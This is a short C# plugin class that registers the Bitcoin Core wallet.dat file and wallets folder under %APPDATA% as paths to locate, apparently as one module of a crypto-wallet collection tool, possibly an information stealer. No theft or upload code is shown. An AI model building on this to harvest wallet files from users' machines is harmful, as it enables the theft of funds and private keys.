using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class BitcoinCoreWallet : CryptoWalletBase
    {
        public BitcoinCoreWallet()
        {
            walletName = "BitcoinCore";
            
            // Bitcoin Core wallet.dat locations
            walletPaths.Add("%APPDATA%\\Bitcoin\\wallet.dat");
            walletPaths.Add("%APPDATA%\\Bitcoin\\wallets");
        }
    }
}
